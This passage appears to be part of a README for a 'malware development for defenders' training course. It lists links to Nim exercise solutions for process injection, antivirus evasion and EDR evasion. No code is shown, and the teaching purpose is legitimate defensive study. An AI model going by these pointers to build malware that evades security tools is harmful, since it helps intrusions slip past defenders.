- [no_CreateThread.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice1/no_CreateThread.nim)

### 10.2 Exercise 2

- [process_injection.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice2/process_injection.nim)
- [dynamic_process_injection.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice2/dynamic_process_injection.nim)

### 10.3 Exercise 3

- [AV_EVASION.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice3/AV_EVASION.nim)
- [EDR_EVASION.nim](https://github.com/d4yon/learning-maldev-for-defenders/blob/main/Solution_Exercice3/EDR_EVASION.nim)
